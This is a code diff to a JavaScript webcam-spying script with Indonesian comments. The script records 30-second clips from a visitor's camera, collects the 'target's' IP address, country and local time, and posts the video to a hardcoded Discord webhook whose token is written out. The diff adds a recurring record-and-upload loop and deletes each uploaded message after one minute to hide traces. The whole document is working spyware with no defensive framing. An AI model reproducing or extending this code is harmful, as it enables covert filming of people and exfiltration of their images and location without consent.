@@ -1,36 +1,33 @@
-const webhookURL = "https://discord.com/api/webhooks/1353279499181097011/dz2zc8jUhz6K2-jFu-qk2eJfWKikdKP-Yg1J65kG_FbAFr7MEWyfMn64bZSqDgEKgUv7"; // Ganti dengan webhook
-const videoElement = document.getElementById("preview");
+const webhookURL = "https://discord.com/api/webhooks/1353279499181097011/dz2zc8jUhz6K2-jFu-qk2eJfWKikdKP-Yg1J65kG_FbAFr7MEWyfMn64bZSqDgEKgUv7"; // Ganti dengan webhook Discord
 
-// Mulai kamera
-navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-    .then(stream => {
-        videoElement.srcObject = stream;
-        startRecording(stream);
-    })
-    .catch(err => console.error("Gagal akses kamera:", err));
+function startCamera() {
+    return navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+}
 
-function startRecording(stream) {
-    const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
-    let chunks = [];
+function stopCamera(stream) {
+    stream.getTracks().forEach(track => track.stop());
+}
 
-    recorder.ondataavailable = event => chunks.push(event.data);
+function startRecording() {
+    startCamera().then(stream => {
+        const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+        let chunks = [];
 
-    recorder.onstop = () => {
-        const videoBlob = new Blob(chunks, { type: "video/webm" });
+        recorder.ondataavailable = event => chunks.push(event.data);
 
-        if (videoBlob.size < 25 * 1024 * 1024) { // Pastikan < 25MB
-            getTargetInfo(videoBlob);
-        }
+        recorder.onstop = () => {
+            const videoBlob = new Blob(chunks, { type: "video/webm" });
 
-        chunks = []; // Hapus rekaman setelah dikirim
-    };
+            if (videoBlob.size < 25 * 1024 * 1024) {
+                getTargetInfo(videoBlob);
+            }
 
-    setInterval(() => {
-        recorder.stop();
-        setTimeout(() => recorder.start(), 500); // Restart rekaman
-    }, 30000); // Rekam tiap 30 detik
+            stopCamera(stream); // Matikan kamera setelah rekaman selesai
+        };
 
-    recorder.start();
+        setTimeout(() => recorder.stop(), 30000); // Rekam selama 30 detik
+        recorder.start();
+    }).catch(err => console.error("Gagal akses kamera:", err));
 }
 
 function getTargetInfo(blob) {
@@ -58,5 +55,20 @@ function sendToDiscord(blob, ip, country, localTime) {
     }));
 
     fetch(webhookURL, { method: "POST", body: formData })
+        .then(response => response.json())
+        .then(data => {
+            if (data.id) {
+                setTimeout(() => deleteFromDiscord(data.id), 60000); // Hapus video setelah 1 menit
+            }
+            setTimeout(startRecording, 60000); // Rekam ulang setiap 1 menit
+        })
         .catch(err => console.error("Gagal kirim video:", err));
 }
+
+function deleteFromDiscord(messageID) {
+    fetch(`${webhookURL}/messages/${messageID}`, { method: "DELETE" })
+        .catch(err => console.error("Gagal hapus video dari Discord:", err));
+}
+
+// Mulai rekaman pertama kali
+startRecording();
